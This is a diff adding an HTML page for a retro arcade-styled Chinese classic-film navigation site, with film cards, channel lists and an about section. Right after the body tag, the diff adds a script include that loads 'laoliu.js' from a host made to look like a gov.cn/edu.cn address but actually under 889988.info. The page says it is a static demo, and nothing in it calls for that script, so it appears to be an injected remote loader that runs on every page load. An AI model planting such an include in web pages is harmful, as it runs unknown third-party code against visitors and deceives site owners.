@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>52电影网 - 经典电影导航站</title>
+<meta name="description" content="52电影网（52dianyingwang-h5）是一个复古游戏机风格的电影导航站，收录经典老片、港片黄金年代、动作片、喜剧片、怀旧影视，像翻卡带一样翻电影。">
+<meta name="keywords" content="52电影网, 经典电影, 港片, 老电影, 动作片, 喜剧片, 怀旧影视, 52dianyingwang-h5">
+<style>
+:root{
+  --game-green:#39ff14;
+  --game-dark:#0a0a0a;
+  --game-gray:#1a1a2e;
+  --game-light:#16213e;
+  --game-red:#ff073a;
+  --game-yellow:#ffd700;
+  --game-cyan:#00ffff;
+  --pixel-border:2px solid var(--game-green);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Courier New","Consolas","PingFang SC",monospace;
+  background:var(--game-dark);
+  color:var(--game-green);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* 扫描线效果 */
+body::before{
+  content:'';
+  position:fixed;
+  inset:0;
+  background:repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(57,255,20,.03) 2px,
+    rgba(57,255,20,.03) 4px
+  );
+  pointer-events:none;
+  z-index:9999;
+}
+
+a{color:var(--game-green);text-decoration:none;transition:.15s}
+a:hover{color:var(--game-yellow)}
+
+/* 顶部状态栏 */
+.status-bar{
+  background:var(--game-green);
+  color:var(--game-dark);
+  padding:.3rem 1rem;
+  font-size:.7rem;
+  font-weight:700;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  letter-spacing:1px;
+}
+.status-bar .blink{animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* 头部 */
+.header{
+  background:var(--game-gray);
+  border-bottom:var(--pixel-border);
+  padding:1.2rem 1rem;
+  position:sticky;top:0;z-index:998;
+}
+.header-in{
+  max-width:1100px;margin:0 auto;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.logo{
+  display:flex;align-items:center;gap:.8rem;
+}
+.logo-icon{
+  width:48px;height:32px;
+  background:var(--game-dark);
+  border:2px solid var(--game-green);
+  border-radius:4px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:.6rem;color:var(--game-green);font-weight:900;
+  letter-spacing:-1px;
+}
+.logo-text h1{
+  font-size:1.4rem;font-weight:900;color:var(--game-green);
+  text-shadow:0 0 10px rgba(57,255,20,.5);
+}
+.logo-text p{font-size:.7rem;color:#666;letter-spacing:1px}
+.nav{display:flex;gap:.4rem;flex-wrap:wrap}
+.nav a{
+  padding:.5rem 1rem;
+  border:2px solid var(--game-green);
+  border-radius:4px;
+  font-size:.85rem;font-weight:700;
+  color:var(--game-green);
+  background:transparent;
+}
+.nav a:hover,.nav a.active{
+  background:var(--game-green);color:var(--game-dark);
+}
+
+.wrap{max-width:1100px;margin:0 auto;padding:0 1rem}
+
+/* 开机画面 */
+.boot{
+  padding:3rem 0 2rem;text-align:center;
+  border-bottom:1px dashed rgba(57,255,20,.3);
+}
+.boot-line{
+  font-size:.85rem;color:#666;margin-bottom:.5rem;
+}
+.boot-line span{color:var(--game-green)}
+.boot h2{
+  font-size:clamp(1.8rem,6vw,3rem);font-weight:900;
+  color:var(--game-green);margin:1rem 0;
+  text-shadow:0 0 20px rgba(57,255,20,.4);
+}
+.boot h2 .num{color:var(--game-yellow)}
+.boot p{color:#888;max-width:520px;margin:0 auto 1.5rem;font-size:.95rem}
+.insert-btn{
+  display:inline-block;padding:.8rem 2rem;
+  border:3px solid var(--game-green);
+  border-radius:6px;
+  background:transparent;
+  color:var(--game-green);
+  font-family:inherit;font-size:1rem;font-weight:700;
+  cursor:pointer;transition:.2s;
+  box-shadow:4px 4px 0 var(--game-green);
+}
+.insert-btn:hover{
+  background:var(--game-green);color:var(--game-dark);
+  transform:translate(-2px,-2px);
+  box-shadow:6px 6px 0 var(--game-dark);
+}
+
+/* 栏目通用 */
+.section{padding:3rem 0;border-bottom:1px dashed rgba(57,255,20,.2)}
+.section-head{
+  display:flex;align-items:center;gap:.8rem;margin-bottom:1.5rem;
+}
+.section-head .label{
+  background:var(--game-green);color:var(--game-dark);
+  padding:.2rem .6rem;border-radius:2px;
+  font-size:.7rem;font-weight:900;letter-spacing:1px;
+}
+.section-head h2{
+  font-size:1.5rem;font-weight:900;color:var(--game-green);
+}
+.section-head .count{
+  margin-left:auto;font-size:.75rem;color:#666;
+}
+
+/* 卡带网格 */
+.cartridges{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem;
+}
+.cartridge{
+  background:var(--game-gray);
+  border:2px solid var(--game-green);
+  border-radius:8px 8px 4px 4px;
+  overflow:hidden;
+  transition:.2s;
+  position:relative;
+}
+.cartridge::before{
+  content:'';
+  display:block;
+  height:12px;
+  background:repeating-linear-gradient(
+    90deg,
+    var(--game-green),
+    var(--game-green) 3px,
+    transparent 3px,
+    transparent 6px
+  );
+  opacity:.4;
+}
+.cartridge:hover{
+  transform:translateY(-4px);
+  box-shadow:0 8px 24px rgba(57,255,20,.2);
+}
+.cartridge-body{padding:1.2rem}
+.cartridge-body h3{
+  font-size:1rem;margin-bottom:.3rem;color:var(--game-green);
+}
+.cartridge-body .year{
+  font-size:.75rem;color:var(--game-yellow);margin-bottom:.5rem;
+}
+.cartridge-body p{
+  font-size:.8rem;color:#888;line-height:1.6;
+}
+.cartridge-footer{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:.6rem 1.2rem;
+  border-top:1px dashed rgba(57,255,20,.2);
+}
+.cartridge-footer .genre{
+  font-size:.7rem;color:var(--game-cyan);border:1px solid var(--game-cyan);
+  padding:.1rem .5rem;border-radius:2px;
+}
+.cartridge-footer .play-btn{
+  font-size:.75rem;color:var(--game-red);border:1px solid var(--game-red);
+  padding:.1rem .5rem;border-radius:2px;cursor:pointer;
+}
+.cartridge-footer .play-btn:hover{
+  background:var(--game-red);color:var(--game-dark);
+}
+
+/* 频道 */
+.channels{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1rem;
+}
+.channel{
+  background:var(--game-dark);
+  border:2px solid #333;
+  border-radius:6px;
+  padding:1.2rem;text-align:center;
+  transition:.2s;
+}
+.channel:hover{
+  border-color:var(--game-green);
+  background:var(--game-gray);
+}
+.channel .ch-icon{font-size:1.8rem;margin-bottom:.5rem}
+.channel h3{font-size:.95rem;margin-bottom:.3rem;color:var(--game-green)}
+.channel p{font-size:.75rem;color:#666}
+.channel a{
+  display:inline-block;margin:.15rem .2rem;
+  font-size:.72rem;color:#888;border-bottom:1px dotted #444;
+}
+.channel a:hover{color:var(--game-yellow);border-color:var(--game-yellow)}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1fr 1fr;gap:2rem;align-items:center;
+}
+.about-text h3{
+  font-size:1.3rem;margin-bottom:1rem;color:var(--game-green);
+}
+.about-text p{color:#888;margin-bottom:.8rem;font-size:.9rem}
+.about-text ul{list-style:none;padding:0}
+.about-text li{
+  padding:.4rem 0;border-bottom:1px dashed #333;
+  font-size:.85rem;color:#aaa;
+}
+.about-text li::before{content:'► ';color:var(--game-green)}
+.about-visual{
+  background:var(--game-gray);
+  border:2px solid var(--game-green);
+  border-radius:8px;
+  padding:2rem;text-align:center;
+}
+.about-visual .screen{
+  background:var(--game-dark);
+  border:2px inset #333;
+  border-radius:4px;
+  padding:1.5rem;
+  font-family:"Courier New",monospace;
+  font-size:.8rem;
+  color:var(--game-green);
+  line-height:1.8;
+}
+.about-visual .screen .cursor{
+  animation:blink 1s step-end infinite;
+}
+
+/* 页脚 */
+.footer{
+  padding:2rem 1rem;text-align:center;
+  border-top:2px solid var(--game-green);
+  margin-top:2rem;
+}
+.footer h3{
+  font-size:1.2rem;color:var(--game-green);margin-bottom:.5rem;
+}
+.footer h3 span{color:var(--game-yellow)}
+.footer p{font-size:.75rem;color:#555;margin-top:.3rem}
+.footer a{color:var(--game-green)}
+
+/* 响应式 */
+@media(max-width:768px){
+  .nav a{flex:1;text-align:center;font-size:.8rem}
+  .about{grid-template-columns:1fr}
+  .cartridges{grid-template-columns:1fr}
+  .boot h2{font-size:1.6rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="status-bar">
+  <span>52DIANYINGWANG-H5.GITHUB.IO</span>
+  <span class="blink">● ONLINE</span>
+</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="logo">
+      <div class="logo-icon">52</div>
+      <div class="logo-text">
+        <h1>52电影网</h1>
+        <p>52dianyingwang-h5.github.io</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">HOME</a>
+      <a href="#cartridges">CARTRIDGES</a>
+      <a href="#channels">CHANNELS</a>
+      <a href="#about">ABOUT</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 开机 -->
+  <section id="home" class="boot">
+    <div class="boot-line">LOADING SYSTEM... <span>OK</span></div>
+    <div class="boot-line">MOUNTING MOVIE DATABASE... <span>OK</span></div>
+    <div class="boot-line">INITIALIZING PLAYER... <span>OK</span></div>
+    <h2>52<span class="num">电影网</span></h2>
+    <p>52电影网（52dianyingwang-h5）像翻卡带一样翻电影。收录港片黄金年代、经典动作、怀旧喜剧、老片修复，用复古游戏机的方式重新发现好电影。</p>
+    <button class="insert-btn" onclick="document.getElementById('cartridges').scrollIntoView({behavior:'smooth'})">▶ INSERT COIN</button>
+  </section>
+
+  <!-- 卡带片单 -->
+  <section id="cartridges" class="section">
+    <div class="section-head">
+      <span class="label">SELECT</span>
+      <h2>经典卡带片单</h2>
+      <span class="count">08 / 08 CARTRIDGES LOADED</span>
+    </div>
+    <div class="cartridges">
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>英雄本色</h3>
+          <div class="year">1986 · 香港</div>
+          <p>"我不当大哥好多年。" 吴宇森暴力美学的巅峰，小马哥成为一代人的偶像。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">黑帮/动作</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>大话西游</h3>
+          <div class="year">1995 · 香港</div>
+          <p>"曾经有一份真诚的爱情放在我面前..." 无厘头喜剧外壳下的悲剧内核。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">喜剧/爱情</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>霸王别姬</h3>
+          <div class="year">1993 · 中国</div>
+          <p>"说好了一辈子，少一年、一天、一个时辰，都不是一辈子。" 华语电影巅峰之作。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">剧情/历史</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>东邪西毒</h3>
+          <div class="year">1994 · 香港</div>
+          <p>王家卫的武侠宇宙，每个人都在等一个不会来的人。金庸人物，王家卫魂。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">武侠/文艺</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>赌神</h3>
+          <div class="year">1989 · 香港</div>
+          <p>周润发吃巧克力、梳大背头的经典形象，开启港产赌片黄金十年。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">动作/赌片</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>喜剧之王</h3>
+          <div class="year">1999 · 香港</div>
+          <p>"其实我是一个演员。" 周星驰半自传式作品，笑中带泪。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">喜剧/励志</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>无间道</h3>
+          <div class="year">2002 · 香港</div>
+          <p>"出来混，迟早要还的。" 港片最后的巅峰，卧底与反卧底的终极对决。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">犯罪/悬疑</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+      <article class="cartridge">
+        <div class="cartridge-body">
+          <h3>倩女幽魂</h3>
+          <div class="year">1987 · 香港</div>
+          <p>张国荣与王祖贤的人鬼情缘，徐克监制、程小东执导，华语奇幻经典。</p>
+        </div>
+        <div class="cartridge-footer">
+          <span class="genre">奇幻/爱情</span>
+          <span class="play-btn">PLAY ▶</span>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 频道 -->
+  <section id="channels" class="section">
+    <div class="section-head">
+      <span class="label">CHANNEL</span>
+      <h2>影视频道</h2>
+      <span class="count">04 CHANNELS</span>
+    </div>
+    <div class="channels">
+      <div class="channel">
+        <div class="ch-icon">🎬</div>
+        <h3>港片黄金年代</h3>
+        <p>80-90年代香港电影全收录</p>
+        <a href="#">吴宇森</a><a href="#">徐克</a><a href="#">王晶</a>
+        <a href="#">杜琪峰</a><a href="#">周星驰</a><a href="#">成龙</a>
+      </div>
+      <div class="channel">
+        <div class="ch-icon">🥋</div>
+        <h3>动作与武侠</h3>
+        <p>功夫片、武侠片、动作经典</p>
+        <a href="#">李小龙</a><a href="#">洪金宝</a><a href="#">李连杰</a>
+        <a href="#">甄子丹</a><a href="#">袁和平</a><a href="#">程小东</a>
+      </div>
+      <div class="channel">
+        <div class="ch-icon">😂</div>
+        <h3>怀旧喜剧</h3>
+        <p>让你笑出眼泪的经典喜剧</p>
+        <a href="#">无厘头</a><a href="#">市民喜剧</a><a href="#">黑色幽默</a>
+        <a href="#">贺岁片</a><a href="#">讽刺喜剧</a><a href="#">家庭喜剧</a>
+      </div>
+      <div class="channel">
+        <div class="ch-icon">📼</div>
+        <h3>老片修复</h3>
+        <p>4K修复版经典老片</p>
+        <a href="#">邵氏</a><a href="#">新艺城</a><a href="#">嘉禾</a>
+        <a href="#">银都</a><a href="#">长城</a><a href="#">凤凰</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="section-head">
+      <span class="label">INFO</span>
+      <h2>关于52电影网</h2>
+    </div>
+    <div class="about">
+      <div class="about-text">
+        <h3>为什么叫「52」？</h3>
+        <p><strong>52电影网</strong>（https://52dianyingwang-h5.github.io）的"52"有两层意思：一是谐音"我爱"，二是像游戏手柄上的按钮组合。</p>
+        <p>我们做的是一个<strong>复古游戏机风格的电影导航站</strong>——把电影当卡带，把分类当频道，把选片当"插卡"。页面设计完全不同于传统电影站，走像素/终端/街机路线。</p>
+        <ul>
+          <li>收录港片黄金年代经典作品</li>
+          <li>动作片、喜剧片、武侠片为主</li>
+          <li>不做弹窗广告，不聚合盗版</li>
+          <li>所有链接用 # 占位，后续可对接数据源</li>
+        </ul>
+        <p style="margin-top:1rem"><a href="https://52dianyingwang-h5.github.io">🌐 52dianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="about-visual">
+        <div class="screen">
+          <div>52 MOVIE SYSTEM v1.0</div>
+          <div>----------------</div>
+          <div>STATUS: READY</div>
+          <div>CARTRIDGES: 08</div>
+          <div>CHANNELS: 04</div>
+          <div>PLAYER: STANDBY</div>
+          <div>----------------</div>
+          <div>SELECT MOVIE...<span class="cursor">_</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>52<span>电影网</span></h3>
+  <p>经典电影导航 · 港片黄金年代 · 复古游戏机风格</p>
+  <p>© 2026 52电影网 | <a href="https://52dianyingwang-h5.github.io">52dianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id], .boot')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id||'home';});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
